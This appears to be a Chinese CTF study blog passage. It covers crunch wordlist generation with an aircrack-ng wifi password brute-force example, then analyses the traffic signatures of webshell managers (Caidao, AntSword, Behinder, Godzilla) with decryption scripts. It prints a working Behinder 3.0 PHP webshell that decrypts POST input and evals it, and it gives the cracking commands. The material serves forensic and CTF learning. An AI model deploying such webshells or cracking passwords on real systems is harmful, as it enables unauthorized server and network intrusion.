  限制相同元素出现的次数</p><p>-e     定义停止字符，即到该字符串就停止生成</p><p>-f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</p><p>-i     改变输出格式，即aaa,aab -&gt; aaa,baa</p><p>-I     通常与-t联合使用，表明该字符为实义字符</p><p>-m     通常与-p搭配</p><p>-o     将密码保存到指定文件</p><p>-p     指定元素以组合的方式进行</p><p>-q     读取密码文件，即读取pass.txt</p><p>-r     定义重某一字符串重新开始</p><p>-s     指定一个开始的字符，即从自己定义的密码xxxx开始</p><p>-t     指定密码输出的格式</p><p>-u     禁止打印百分比（必须为最后一个选项）</p><p>-z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </p><p>特殊字符，通常与-t配合使用</p><p>%      代表数字</p><p>^      代表特殊符号</p><p>@      代表小写字符</p><p>,      代表大写字符</p><h3 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h3><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">crunch 6 6 123 -o number.txt   &#x2F;&#x2F;生成六位以123元素为组合的字典集，并输出到number.txt</font></p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716617221789-837ade83-d7c9-48ea-96df-1d4712847746-399559.png" alt="1716617221789-837ade83-d7c9-48ea-96df-1d4712847746.png"></p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716617240055-ba818cf4-2cf8-424f-9eff-fe2892f3a0c2-468853.png" alt="1716617240055-ba818cf4-2cf8-424f-9eff-fe2892f3a0c2.png"></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">crunch 1 1 -q read   &#x2F;&#x2F;读取read文件中每行内容作为基本字符生成字典</font></p><p><font style="color:rgb(77, 77, 77);">read文件内容如下：</font></p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716617261938-a8369232-d4a5-4511-8a79-861a289f3a44-260051.png" alt="1716617261938-a8369232-d4a5-4511-8a79-861a289f3a44.png"></p><p><font style="color:rgb(77, 77, 77);">生成的字典集结果如下：</font></p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716617304995-4aa62323-a79f-4dad-a8bb-6623d6934746-768215.png" alt="1716617304995-4aa62323-a79f-4dad-a8bb-6623d6934746.png"></p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>wifi密码</p><p>1、自定义生成字典进行爆破</p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716614347094-5341c79a-7d63-4465-b33e-a09490b1fc86-559129.png" alt="1716614347094-5341c79a-7d63-4465-b33e-a09490b1fc86.png"></p><p>2、aircrack-ng wifipwd.cap -w 15000.txt </p><p>通常情况是选用一些网上常用的passwords尝试爆破</p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716614850367-454280e6-7912-4ca1-a25e-96d4167811ce-094405.png" alt="1716614850367-454280e6-7912-4ca1-a25e-96d4167811ce.png"></p><p>选择12</p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716616817805-3715f99c-6dce-407e-822a-37fc9c0aa8eb-810723.png" alt="1716616817805-3715f99c-6dce-407e-822a-37fc9c0aa8eb.png"></p><p>发现找不到key</p><p>3、那就使用自定义字典生成，使用kali自带的crunch生成字典</p><p>特殊字符，通常与-t配合使用</p><p>%      代表数字</p><p>^      代表特殊符号</p><p>@      代表小写字符</p><p>,      代表大写字符</p><p>crunch 8 8 -t p@@@r%%6 -o number.txt</p><p>把生成字典放入number.txt里面</p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716616999760-e37523b4-79c6-4f4f-acc2-c69d38ad9de7-237203.png" alt="1716616999760-e37523b4-79c6-4f4f-acc2-c69d38ad9de7.png"></p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716617021105-6d214f08-a9fe-4f33-8229-c173d58d08a2-357746.png" alt="1716617021105-6d214f08-a9fe-4f33-8229-c173d58d08a2.png"></p><p>4、然后再进行一次爆破</p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716617670558-aea5d673-9ec6-4f8f-9904-e27ea4f02a01-583622.png" alt="1716617670558-aea5d673-9ec6-4f8f-9904-e27ea4f02a01.png"></p><blockquote><p>更新: 2024-10-17 10:15:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/kv0qvdt67da9ddyy">https://www.yuque.com/chaye-apqbl/vsc85q/kv0qvdt67da9ddyy</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/WEBshell%E6%B5%81%E9%87%8F/"/>
    <url>/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/WEBshell%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="WEBshell流量"><a href="#WEBshell流量" class="headerlink" title="WEBshell流量"></a>WEBshell流量</h1><h2 id="几种常见WEBshell管理器的流量特征"><a href="#几种常见WEBshell管理器的流量特征" class="headerlink" title="几种常见WEBshell管理器的流量特征"></a>几种常见<code>WEBshell</code>管理器的流量特征</h2><p>简介：<code>**Webshell**</code>是通过服务器开放的端口获取服务器的某些权限的代码</p><h3 id="菜刀Caidao流量"><a href="#菜刀Caidao流量" class="headerlink" title="菜刀Caidao流量"></a>菜刀<code>Caidao</code>流量</h3><p><strong>一些特征流量的截图</strong></p><p><img src="/./img/CLmSRSKONEGtoVnF/1674113313164-4ebe90b8-0be5-48b4-ad58-f21fc45f9aa8-445028.png" alt="1674113313164-4ebe90b8-0be5-48b4-ad58-f21fc45f9aa8.png"></p><p><img src="/./img/CLmSRSKONEGtoVnF/1674116629098-7322643c-d927-4204-b8d6-32b11a43209e-440968.png" alt="1674116629098-7322643c-d927-4204-b8d6-32b11a43209e.png"></p><p>菜刀流量返回的标志</p><p><img src="/./img/CLmSRSKONEGtoVnF/1674113721388-702e2ce4-0978-4eb7-9e5d-ef9647c760f6-659766.png" alt="1674113721388-702e2ce4-0978-4eb7-9e5d-ef9647c760f6.png"></p><p><strong>前后这个</strong><code>**X@Y**</code><strong>需要去掉，但是每次都是不一样的，所以需要看情况而定，反正就三位。</strong></p><hr><p><strong>总结一下菜刀的流量特征：</strong></p><p><code>**PHP**</code><strong>：</strong></p><ul><li>请求包中：<code>**ua**</code>头为百度，火狐</li><li><code>**eval=(base64_decode($_POST[z0]))**</code>**，**少数时候<code>eval</code>方法会被<code>assert</code>方法替代</li><li><code>**z0**</code><strong>的内容</strong><code>**base64**</code><strong>解密之后开头是</strong><code>**@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);**</code></li></ul><p><code>**JSP**</code><strong>：</strong></p><ul><li><code>**i=A&amp;z0=GB2312**</code></li><li>菜刀链接<code>**JSP**</code>木马时，第一个参数定义操作，其中参数值为<code>**A-Q**</code>，如<code>**i=A**</code>**，<strong>第二个参数指定编码，其参数值为编码，如<code>**z0=GB2312**</code></strong>，**有时候<code>**z0**</code>后面还会接着又<code>**z1=**</code>参数来加入攻击载荷</li></ul><p><code>ASP</code>：</p><ul><li><code>Execute</code>函数用于执行传递的攻击<code>payload</code>，这是必不可少的，这个等同于<code>php</code>类中<code>eval</code>函数</li><li><code>OnError ResumeNext</code>，这部分是大部分<code>ASP</code>客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码</li><li><code>Response.Write</code>和<code>Response.End</code>是必有的，是来完善整个操作的</li></ul><hr><h3 id="中国蚁剑流量"><a href="#中国蚁剑流量" class="headerlink" title="中国蚁剑流量"></a>中国蚁剑流量</h3><p><strong>一些特征流量的截图</strong></p><p><img src="/./img/CLmSRSKONEGtoVnF/1675606448054-b4dadc3e-cac8-45af-9398-6aa2dd111623-315207.png" alt="1675606448054-b4dadc3e-cac8-45af-9398-6aa2dd111623.png"></p><p>还有一种基于<code>RSA</code>加密的传输方式：</p><p>中国蚁剑从<code>2.1.0</code>版本开始，新增加了<code>PHP RSA</code>编辑器，内置编辑器<code>RSA</code>模块，使用了<code>RSA</code>非对称加密进行传输。<strong>可以新建编辑器–</strong><code>**RSA**</code><strong>配置–点击生成公私钥，然后配置公私钥和</strong><code>**PHP**</code><strong>代码即可</strong>，如下</p><p><img src="/./img/CLmSRSKONEGtoVnF/1675660203225-8a4b327e-7036-4e88-83c0-576cfa5c8aef-356054.png" alt="1675660203225-8a4b327e-7036-4e88-83c0-576cfa5c8aef.png"></p><p>然后加密流量如下图</p><p><img src="/./img/CLmSRSKONEGtoVnF/1675660285466-20b3e4c2-931a-44d9-ab83-a52e6182d4bc-569719.png" alt="1675660285466-20b3e4c2-931a-44d9-ab83-a52e6182d4bc.png"></p><p><strong>对应的解密步骤如下</strong></p><ul><li><strong>找到公钥解出</strong><code>**N**</code><strong>和</strong><code>**E**</code></li><li><strong>然后用下面脚本解密客户端的发送流量</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> libnum<br>n = <br>e = <br>c = <br>c1 = c.split(<span class="hljs-string">&quot;|&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c1:<br>    c = base64.b64decode(i)<br>    c = libnum.s2n(c)<br>    m = <span class="hljs-built_in">pow</span>(c,e,n)<br>    string = libnum.n2s(m)<br>    <span class="hljs-built_in">print</span>(string)<br></code></pre></td></tr></table></figure><ul><li><strong>解出来之后有时候会发现客户端要求服务器的返回流量是</strong><code>**AES**</code><strong>加密流量</strong></li><li><strong>于是需要进行一个</strong><code>**AES**</code><strong>流量解密，也是找到</strong><code>**16**</code><strong>位密钥，和冰蝎差不多，****<font style="color:#DF2A3F;">解密记得去掉头和尾的随机数</font></strong></li><li><strong>解密网站：</strong><a href="https://tool.lmeee.com/jiami/aes">https://tool.lmeee.com/jiami/aes</a></li><li><strong>解密脚本：</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>cipher=<span class="hljs-string">b&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;</span><br>en_text=base64.b64decode(cipher)<br>key=<span class="hljs-string">b&#x27;hm3pq66843bbbrdg&#x27;</span><br><br>aes = AES.new(key,AES.MODE_ECB) <span class="hljs-comment">#创建一个aes对象,AES.MODE_ECB 表示模式是ECB模式</span><br>den_text = aes.decrypt(en_text) <span class="hljs-comment"># 解密密文</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文：&quot;</span>,den_text)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>encrypted_string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入蚁剑的ChR加密请求体：&quot;</span>)<br><br><span class="hljs-comment"># 使用正则表达式提取每个字符表达式中的十六进制值</span><br>hex_values = re.findall(<span class="hljs-string">r&#x27;ChR\((.*?)\)&#x27;</span>, encrypted_string)<br><br><span class="hljs-comment"># 将每个十六进制值解密为 ASCII 字符</span><br>decrypted_chars = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_value, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> hex_values]<br><br><span class="hljs-comment"># 将解密后的字符拼接成一个字符串</span><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_chars)<br><br><span class="hljs-built_in">print</span>(decrypted_string)<br><span class="hljs-comment"># 保存输出内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;analyze.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(decrypted_string)<br></code></pre></td></tr></table></figure><p><strong>总结一下蚁剑的流量特征：</strong></p><ul><li>相对于菜刀来说请求头是蚁剑</li><li><img src="/./img/CLmSRSKONEGtoVnF/1675606905919-b65c326f-f967-4932-ad25-b8a5f7692713-730590.png" alt="1675606905919-b65c326f-f967-4932-ad25-b8a5f7692713.png"></li><li>然后<code>shell</code>的名字是一串随机十六进制数</li><li>响应包的结果返回格式是：随机数+<code>base64</code>编码后的内容+随机数</li><li>加密可能是纯<code>Base64</code>也可能是<code>RSA+Base64``AES+Base64</code>，也有时候是<code>rot13</code>之类的</li><li>那么对应我们的解密也是有几种情况了</li></ul><h3 id="冰蝎Behinder-2-0流量"><a href="#冰蝎Behinder-2-0流量" class="headerlink" title="冰蝎Behinder``2.0流量"></a>冰蝎<code>Behinder``2.0</code>流量</h3><p>下载地址：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><p>冰蝎和前两者的区别就是可以进行动态流量加密，且加密密钥是由使用者来设定</p><p><img src="/./img/CLmSRSKONEGtoVnF/1675608193831-d9131f60-5664-4408-bbef-16868702567d-028196.png" alt="1675608193831-d9131f60-5664-4408-bbef-16868702567d.png"></p><p>加密函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-variable">$result</span> = <span class="hljs-keyword">array</span>();<br>  <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>  <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;msg&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$content</span>);<br>  <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>),<span class="hljs-variable">$key</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))   <span class="hljs-comment">#异或加密</span><br>  &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span>  <span class="hljs-comment">#AES加密</span><br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>演示流量：<a href="">冰蝎2.0流量分析.zip</a></p><p><strong>总结一下流量特征：</strong></p><ul><li>第一阶段请求中返回包状态码为<code>**200**</code>，返回内容必定是<code>**16**</code><strong>位的密钥，密钥协商过程，一共两次，第二次返回的才是最终的密钥，第一次的是测试连接产生的随机密钥</strong></li><li><strong>加密方式一般是</strong><code>**AES+BASE64**</code></li><li>请求头存在：<ul><li><code>**Accept: application/json, text/javascript, */*; q=0.01**</code></li><li><code>**Accept: text/html, image/gif, image/jpeg, ; q=.2, /; q=.2**</code></li><li><code>**Content-Type: application/octet-stream**</code></li><li><code>**UA**</code><strong>一般都是火狐特征居多，他内置了很多的</strong><code>**UA**</code><strong>头</strong></li><li><code>**Connection: Keep-Alive**</code><strong>，默认使用的长连接是为了避免频繁的握手造成的资源丢失</strong></li><li><code>**Content-Length: 16**</code></li></ul></li><li>请求<code>**Cookie**</code>的格式都为: <code>**Cookie: PHPSESSID=; path=/；**</code></li></ul><p><strong>冰蝎</strong><code>**2.0**</code><strong>流量解密</strong></p><ul><li><code>**PHP**</code><strong>的一般是</strong><code>**AES-128**</code><strong>加密</strong>，我们需要对返回流量进行一次<code>AES</code>的解密，然后在进行<code>base64</code>解密，才能还原数据。</li><li><a href="http://tools.bugscaner.com/cryptoaes/">http://tools.bugscaner.com/cryptoaes/</a></li><li><strong>有时候会是异或加密，</strong><code>**AES**</code><strong>就不能解密了，发送流量和返回流量都有可能加密</strong></li><li>服务器支持<code>**https**</code><strong>就是</strong><code>**aes**</code><strong>加密，<strong>如果服务器</strong>不支持</strong><code>**https**</code><strong>那么就是异或加密</strong></li></ul><h3 id="冰蝎Behinder-3-0流量"><a href="#冰蝎Behinder-3-0流量" class="headerlink" title="冰蝎Behinder``3.0流量"></a>冰蝎<code>Behinder``3.0</code>流量</h3><p><code>key</code>值是固定的，相对于<code>2.0</code>的随机来说</p><p>默认密码是<code>**rebeyond**</code><strong>，</strong><code>**key**</code><strong>就是这个密码</strong><code>**hash**</code><strong>的前</strong><code>**16**</code><strong>位，所以密钥不是随机的</strong></p><p>全程不再交互密钥生成，一共就俩次请求，第一次请求为判断是否可以建立连接，少了俩次 <code>get</code> 获取冰蝎动态密钥的行为，第二次发送 <code>phpinfo</code> 等代码执行，获取网站的信息</p><p><strong>加密函数如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>  <span class="hljs-title function_ invoke__">session_write_close</span>();<br>  <span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>  &#123;<br>    <span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>    <span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>           <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>          &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no openssl&quot;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>  &#125;<br>  <span class="hljs-comment">// echo $post;</span><br>  <span class="hljs-comment">// echo &quot;------------------&quot;;</span><br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-comment">// echo $arr[1];</span><br>    <span class="hljs-comment">// echo &quot;------------------&quot;;</span><br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解密步骤基本和<code>2.0</code>差不多</p><p><strong>总结一下流量特征：</strong></p><ul><li>请求包中<code>**content-length**</code>为<code>**5740**</code>或<code>**5720**</code>（可能会根据<code>**Java**</code>版本而改变）</li><li>请求头存在：<code>**Pragma: no-cache，Cache-Control: no-cache**</code></li><li>请求头存在：<code>**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.9**</code></li></ul><hr><hr><h3 id="冰蝎Behinder-4-0流量"><a href="#冰蝎Behinder-4-0流量" class="headerlink" title="冰蝎Behinder``4.0流量"></a>冰蝎<code>Behinder``4.0</code>流量</h3><hr><hr><hr><hr><hr><h3 id="哥斯拉godzilla流量"><a href="#哥斯拉godzilla流量" class="headerlink" title="哥斯拉godzilla流量"></a>哥斯拉<code>godzilla</code>流量</h3><p>下载地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>特点：</p><ul><li>哥斯拉全部类型的 <code>shell</code> 均过市面所有静态查杀</li><li>哥斯拉流量加密过市面全部流量 <code>waf</code></li><li>哥斯拉的自带的插件是冰蝎、蚁剑不能比拟的</li></ul><p><img src="/./img/CLmSRSKONEGtoVnF/1676003396444-9e9859e3-f472-4365-b986-796b399bb4fb-721966.png" alt="1676003396444-9e9859e3-f472-4365-b986-796b399bb4fb.png"></p><p><strong>总结一下流量特征：</strong></p><ul><li><strong>请求头</strong><ul><li><code>**Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8**</code></li><li><code>**&lt;font style=&quot;color:#DF2A3F;&quot;&gt;Cookie&lt;/font&gt;**</code><strong><font style="color:#DF2A3F;">的结尾会出现分号，强特征</font></strong></li></ul></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">响应头</font></strong><ul><li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;Cache-Control: no-store, no-cache, must-revalidate&lt;/font&gt;**</code></li></ul></li><li><strong>密钥信息一般是在服务器流量里面进行协商的，</strong><code>**&lt;font style=&quot;color:#DF2A3F;&quot;&gt;pass&lt;/font&gt;**</code><strong>就是哥斯拉的默认密码</strong></li><li><code>**PHP**</code><strong>的一般是发送流量直接解，返回流量需要去掉前后</strong><code>**16**</code><strong>位的附加数据，然后解</strong><code>**base64**</code><strong>然后解异或，需要密钥</strong></li><li><strong>由于返回的是经过</strong><code>**gzip**</code><strong>的数据，我们需要进行一个</strong><code>**gzdecode()**</code><strong>的解密</strong></li><li><strong>解密脚本如下：</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&#x27;</span>),<span class="hljs-variable">$key</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>PHP</code>的例题：<a href="">dasflow.zip</a></p><p>可以得到最后的<code>flag</code>为<code>**DASCTF&#123;7892a81d23580e4f3073494db431afc5&#125;**</code></p><ul><li><code>**Java**</code><strong>的一般是去掉前后</strong><code>**16**</code><strong>位的附加数据，然后解</strong><code>**base64**</code><strong>然后解</strong><code>**AES**</code><strong>的</strong><code>**ECB/CBC**</code><strong>，需要密钥，一般密钥和</strong><code>**IV**</code><strong>是一样的</strong></li><li><hr></li></ul><p><strong>批量解密脚本如下：</strong><a href="">哥斯拉流量批量解密脚本.zip</a></p><p>有点问题：发送包解密不了，不过我提取出来了，需要配合上面的脚本使用</p><h1 id="例题"><a href="#例题" class="headerlink" 